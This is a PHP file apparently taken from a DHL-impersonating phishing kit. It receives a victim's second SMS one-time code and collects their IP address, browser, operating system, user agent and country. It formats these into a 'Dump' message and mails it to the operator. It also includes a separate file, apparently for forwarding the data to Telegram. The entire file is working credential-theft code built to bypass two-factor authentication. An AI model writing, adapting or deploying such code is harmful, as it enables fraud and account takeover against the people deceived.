<?php

@ini_set('display_errors', 'on');
if(isset($_POST['otp2'])){session_start(); 
require 'detect.php';
include "setting.php";
$IP = getenv("REMOTE_ADDR");
$date = date("d M, Y");
$times = date("g:i a");

$otp2 = $_POST['otp2'];
$useragent = $_SERVER['HTTP_USER_AGENT'];

$ecran = $_SESSION['computer'];
$brow = $_SESSION['browser'];
$sys = $_SESSION['os'];
$code = $_SESSION['ip_countryCode']=clientData('code');
$country = strtolower($code);

//msg for email & telegram "text"
$msg = '

[+]━━━━━━━━━【💖DHL💖】━━━━━━━━━━[+]
[+]━━━━━【👤 SMS 2 INFO]━━━━[+]
[👤 CODE ] = '.$otp2.'
[+]━━━━━━━━━【💻 System】━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$IP.'
[⏰ TIME/DATE] ='.$times.' / '.$date.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🖖 FINGERPRINT] = '.$useragent.'
[+]━━━━━━━━━【💖DHL💖】━━━━━━━━━━[+]
';
$subject  = " Dump / ".$_SERVER['REMOTE_ADDR']." / ".$country." SMS 2 ";$headers .= "From: DHL" . "\r\n";
mail($yourmail, $subject, $msg, $headers);
include("api.php");
}
?>